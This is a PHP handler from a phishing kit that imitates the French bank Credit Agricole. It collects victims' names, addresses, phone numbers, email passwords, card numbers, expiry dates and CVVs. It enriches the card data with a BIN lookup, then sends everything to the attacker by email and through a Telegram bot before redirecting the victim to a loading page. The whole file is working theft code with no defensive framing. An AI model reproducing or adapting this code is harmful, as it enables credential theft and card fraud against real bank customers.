<?php

error_reporting(0);
session_start();
include "../../config.php";
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
    
    $bin = $_POST['cc_number'] ;
    $bin = preg_replace('/\s/', '', $bin);
    $bin = substr($bin,0,8);
    $url = "https://lookup.binlist.net/".$bin;
    $headers = array();
    $headers[] = 'Accept-Version: 3';
    $ch = curl_init();  
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $resp=curl_exec($ch);
    curl_close($ch);
    $xBIN = json_decode($resp, true);
    $_SESSION['bank_name'] = $xBIN["bank"]["name"];
    $_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
    $_SESSION['bank_type'] = strtoupper($xBIN["type"]);
    $_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);
    $_SESSION['bank_country'] = $xBIN["country"]["name"];
$hostname = gethostbyaddr($ip);
$message = "[========== 🇫🇷 Credit-Agricole(Info) 🇫🇷 ===========]\r\n";
$message .= "|First name       : ".$_POST['nom']."\r\n";
$message .= "|Last name       : ".$_POST['prenom']."\r\n";
$message .= "|Address      	 : ".$_POST['address']."\r\n";
$message .= "|City       : ".$_POST['city']."\r\n";
$message .= "|Zip       : ".$_POST['zip_code']."\r\n";
$message .= "|Phone      	 : ".$_POST['phone']."\r\n";
$message .= "[========== 🇫🇷 (E-mail) 🇫🇷 ===========]\r\n";
$message .= "|Email      	 : ".$_POST['mail']."\r\n";
$message .= "|Password      	 : ".$_POST['pw']."\r\n";
$message .= "[========== 🇫🇷 (Card) 🇫🇷 ===========]\r\n";
$message .= "|Card      	 : ".$_POST['cc_number']."\r\n";
$message .= "|Exp                : ".$_POST['cc_date']."\r\n";
$message .= "|Cvv       	 : ".$_POST['cc_cvv']."\r\n";
$message .= "|Bank Name          : ".$_SESSION['bank_name']."\r\n";
$message .= "|Card Type       	 : ".$_SESSION['bank_type']."\r\n";
$message .= "|Card Brand       	 : ".$_SESSION['bank_brand']."\r\n";
$message .= "|Card Country       	 : ".$_SESSION['bank_country']."\r\n";
$message .= "[========= $ip ========]\r\n";
$send = $email; 
$subject = "(".$_SESSION["user"].") Credit-Agricole RZLT $ip";
$headers = "From: [CH1_CA **]<info@CH1.com>";
mail($send,$subject,$message,$headers);
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );


   
echo"<script>location.replace('../loading2.php');</script>";
 




?>